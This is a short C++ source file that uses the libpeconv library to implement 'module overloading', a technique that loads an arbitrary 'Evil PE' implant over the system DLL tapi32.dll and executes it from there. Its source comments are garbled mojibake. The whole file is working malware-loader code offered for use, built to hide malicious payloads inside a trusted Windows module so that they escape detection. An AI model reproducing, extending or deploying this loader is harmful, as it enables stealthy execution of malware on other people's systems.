#include <Windows.h>
#include <iostream>
#include <peconv.h>
#include <utils.h>

using namespace std;


int main(int argc, char* argv[])
{
	char target_dll[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\tapi32.dll", target_dll, MAX_PATH);
	char* dll_name = target_dll;
	char* implant_name = argv[1];
	cout << "[*] Target Dll: " << dll_name << endl;
	cout << "[*] Evil PE: " << implant_name << endl;

	size_t raw_size = 0;
	BYTE* raw_payload = peconv::load_file((LPCTSTR)implant_name, raw_size);

	// ģ������
	LPVOID mapped = ModuleOverLoading(raw_payload, raw_size,dll_name);

	// raw_payload���ڴ����Ѿ�չ������ȡƫ��
	DWORD ep_rva = peconv::get_entry_point_rva(raw_payload);
	// ���evil code�ǲ���Dll
	bool is_dll = peconv::is_module_dll(raw_payload);
	cout << boolalpha;
	cout << "[*] Is Dll: " << is_dll << endl;
	//�ͷ�load_file
	peconv::free_file(raw_payload); raw_payload = nullptr;
	// ���ִ��
	int ret = run_implant(mapped, ep_rva, is_dll);
	
	cout << "[+] Implant finished, ret: " << dec << ret << endl;
	//undo_overloading(mapped, target_dll);
	
	return 0;
}